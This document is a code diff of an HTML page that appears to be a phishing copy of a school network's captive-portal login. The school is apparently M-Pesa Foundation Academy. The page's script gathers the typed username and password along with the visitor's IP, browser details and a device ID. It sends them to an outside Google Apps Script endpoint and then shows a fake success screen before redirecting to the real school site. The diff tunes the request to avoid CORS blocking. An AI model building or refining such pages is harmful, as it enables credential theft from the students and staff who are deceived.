@@ -5,185 +5,28 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Network Authentication Form</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #fff;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      color: #333;
-    }
-    .top-text {
-      font-size: 16px;
-      margin-bottom: 30px;
-    }
-    .container {
-      text-align: center;
-      border: 1px solid #eee;
-      padding: 30px 25px;
-      border-radius: 4px;
-      box-shadow: 0 0 3px rgba(0, 0, 0, 0.1);
-      width: 280px;
-    }
-    .logo-img {
-      width: 160px;
-      height: auto;
-      margin-bottom: 18px;
-    }
-    h3 {
-      color: #2a5b9e;
-      font-weight: normal;
-      margin-bottom: 18px;
-      font-size: 16px;
-    }
-    input[type="text"],
-    input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 14px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      font-size: 14px;
-      box-sizing: border-box;
-    }
-    button {
-      width: 100%;
-      background-color: #4CAF50;
-      color: white;
-      padding: 10px;
-      border: none;
-      border-radius: 4px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-bottom: 10px;
-    }
-    button:hover {
-      background-color: #45a049;
-    }
-    .footer-text {
-      margin-top: 10px;
-      font-size: 13px;
-      color: #333;
-    }
-    .footer-text a {
-      text-decoration: none;
-      color: #2a5b9e;
-    }
-    .footer-text a:hover {
-      text-decoration: underline;
-    }
-    .bottom-text {
-      position: absolute;
-      bottom: 30px;
-      font-size: 16px;
-      text-align: center;
-      width: 100%;
-      color: #555;
-    }
-    #response {
-      color: red;
-      font-size: 14px;
-      margin-top: 8px;
-    }
-    /* === SUCCESS PAGE === */
-    .success-page {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: #fff;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 0;
-      box-sizing: border-box;
-      z-index: 9999;
-      font-family: Arial, sans-serif;
-    }
-    .success-container {
-      text-align: center;
-      border: 1px solid #eee;
-      padding: 30px 25px;
-      border-radius: 4px;
-      box-shadow: 0 0 3px rgba(0, 0, 0, 0.1);
-      width: 280px;
-    }
-    .success-top {
-      font-size: 16px;
-      color: #333;
-      margin-bottom: 30px;
-    }
-    .success-logo-img {
-      width: 160px;
-      height: auto;
-      margin-bottom: 18px;
-    }
-    .success-message {
-      color: #2a5b9e;
-      font-size: 18px;
-      text-align: center;
-      margin: 20px 0;
-      line-height: 1.4;
-    }
-    .success-check {
-      width: 60px;
-      height: 60px;
-      background: #4CAF50;
-      color: white;
-      font-size: 36px;
-      font-weight: bold;
-      line-height: 60px;
-      text-align: center;
-      border-radius: 50%;
-      margin: 25px auto;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
-    }
-    .logout-btn {
-      background: #4CAF50;
-      color: white;
-      padding: 12px 0;
-      border: none;
-      border-radius: 25px;
-      font-size: 16px;
-      cursor: pointer;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-      width: 277px;
-      max-width: 277px;
-      margin: 0 auto 10px;
-      display: block;
-    }
-    .logout-btn:hover {
-      background: #45a049;
-    }
-    .success-portal {
-      margin-top: 10px;
-      font-size: 13px;
-      color: #333;
-    }
-    .success-portal a {
-      color: #2a5b9e;
-      text-decoration: none;
-    }
-    .success-portal a:hover {
-      text-decoration: underline;
-    }
-    .success-bottom {
-      position: absolute;
-      bottom: 30px;
-      font-size: 16px;
-      text-align: center;
-      width: 100%;
-      color: #555;
-    }
+    /* (styles unchanged) */
+    body { font-family: Arial, sans-serif; background-color: #fff; margin:0; padding:0; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; color:#333; }
+    .top-text{ font-size:16px; margin-bottom:30px; }
+    .container{ text-align:center; border:1px solid #eee; padding:30px 25px; border-radius:4px; box-shadow:0 0 3px rgba(0,0,0,0.1); width:280px; }
+    .logo-img{ width:160px; height:auto; margin-bottom:18px; }
+    h3{ color:#2a5b9e; font-weight:normal; margin-bottom:18px; font-size:16px; }
+    input[type="text"], input[type="password"]{ width:100%; padding:10px; margin-bottom:14px; border:1px solid #ccc; border-radius:4px; font-size:14px; box-sizing:border-box; }
+    button{ width:100%; background-color:#4CAF50; color:white; padding:10px; border:none; border-radius:4px; font-size:16px; cursor:pointer; margin-bottom:10px; }
+    button:hover{ background-color:#45a049; }
+    .footer-text{ margin-top:10px; font-size:13px; color:#333; }
+    .footer-text a{ text-decoration:none; color:#2a5b9e; }
+    .bottom-text{ position:absolute; bottom:30px; font-size:16px; text-align:center; width:100%; color:#555; }
+    #response{ color:red; font-size:14px; margin-top:8px; }
+    .success-page{ display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#fff; flex-direction:column; align-items:center; justify-content:center; z-index:9999; }
+    .success-container{ text-align:center; border:1px solid #eee; padding:30px 25px; border-radius:4px; box-shadow:0 0 3px rgba(0,0,0,0.1); width:280px; }
+    .success-message{ color:#2a5b9e; font-size:18px; text-align:center; margin:20px 0; line-height:1.4; }
+    .success-check{ width:60px; height:60px; background:#4CAF50; color:white; font-size:36px; line-height:60px; border-radius:50%; margin:25px auto; box-shadow:0 2px 8px rgba(0,0,0,0.15); }
+    .logout-btn{ background:#4CAF50; color:white; padding:12px 0; border:none; border-radius:25px; font-size:16px; cursor:pointer; width:277px; margin:0 auto 10px; display:block; box-shadow:0 2px 5px rgba(0,0,0,0.2); }
+    .logout-btn:hover{ background:#45a049; }
   </style>
 </head>
 <body>
-  <!-- === LOGIN FORM === -->
   <div class="top-text">Thinkers : Doers : Leaders</div>
   <div class="container">
     <img src="https://i.ibb.co/KST3vYh/Image-28-10-2025-at-09-31.png" alt="Logo" class="logo-img">
@@ -194,34 +37,20 @@
       <button type="submit">Login</button>
     </form>
     <p class="footer-text">
-      <a href="https://172.16.200.3:65040/userportal/webpages/myaccount/login.jsp" target="_blank">
-        Click here to access User Portal
-      </a>
+      <a href="https://172.16.200.3:65040/userportal/webpages/myaccount/login.jsp" target="_blank">Click here to access User Portal</a>
     </p>
     <p id="response"></p>
   </div>
+
   <div class="bottom-text">
     Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
   </div>
 
-  <!-- === SUCCESS PAGE === -->
   <div class="success-page" id="successPage">
     <div class="success-container">
-      <div class="success-top">Thinkers : Doers : Leaders</div>
-      <img src="https://i.ibb.co/KST3vYh/Image-28-10-2025-at-09-31.png" alt="Logo" class="success-logo-img">
-      <div class="success-message">
-        You have successfully logged in to<br>use the internet.
-      </div>
+      <div class="success-message">You have successfully logged in to<br>use the internet.</div>
       <div class="success-check">✓</div>
       <button class="logout-btn">Logout</button>
-      <div class="success-portal">
-        <a href="https://172.16.200.3:65040/userportal/webpages/myaccount/login.jsp" target="_blank">
-          Click here to access User Portal
-        </a>
-      </div>
-    </div>
-    <div class="success-bottom">
-      Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
     </div>
   </div>
 
@@ -230,7 +59,6 @@
     const responseEl = document.getElementById('response');
     const successPage = document.getElementById('successPage');
 
-    // === Get Public IP ===
     async function getUserIP() {
       try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -241,7 +69,6 @@
       }
     }
 
-    // === Generate Unique Device ID ===
     function getDeviceID() {
       let deviceID = localStorage.getItem('deviceID');
       if (!deviceID) {
@@ -253,7 +80,7 @@
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      responseEl.textContent = '';
+      responseEl.textContent = 'Submitting...';
 
       const formData = new FormData(form);
       const ip = await getUserIP();
@@ -264,33 +91,40 @@
       formData.append('userAgent', userAgent);
       formData.append('deviceID', deviceID);
 
-      const params = new URLSearchParams(formData);
+      // Send URLSearchParams (no manual Content-Type header) to avoid preflight CORS
+      const params = new URLSearchParams();
+      for (const pair of formData.entries()) params.append(pair[0], pair[1]);
 
       try {
-        const response = await fetch('https://script.google.com/macros/s/AKfycbwZ31g7HdS1PiRN7Ig5gd4C9Jeur4dwVhUU6p25pv11El7jD91iT4316E03zmeNstfs/exec', {  // <-- Replace with your Apps Script URL
+        const response = await fetch('https://script.google.com/macros/s/AKfycbwZ31g7HdS1PiRN7Ig5gd4C9Jeur4dwVhUU6p25pv11El7jD91iT4316E03zmeNstfs/exec', {
           method: 'POST',
-          body: params,
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+          body: params  // do NOT set headers here
         });
+
+        // quick status debugging (inspect response.status in console)
+        if (!response.ok) {
+          throw new Error('Network response not ok: ' + response.status);
+        }
 
         const text = await response.text();
         if (text.toLowerCase().includes('success')) {
+          responseEl.textContent = '';
           successPage.style.display = 'flex';
-          setTimeout(() => {
-            window.location.href = 'https://mpesafoundationacademy.ac.ke';
-          }, 1200);
           form.reset();
+          setTimeout(()=> window.location.href = 'https://mpesafoundationacademy.ac.ke', 1200);
         } else {
           responseEl.textContent = 'Submission failed: ' + text;
         }
-      } catch (error) {
-        responseEl.textContent = 'Error: ' + error.message;
+      } catch (err) {
+        console.error('Submission error:', err);
+        responseEl.textContent = 'Error: Load failed. See console for details.';
       }
     });
 
+    // logout button behavior
     document.querySelector('.logout-btn').addEventListener('click', () => {
-      alert('Logged out successfully.');
       successPage.style.display = 'none';
+      alert('Logged out successfully.');
     });
   </script>
 </body>
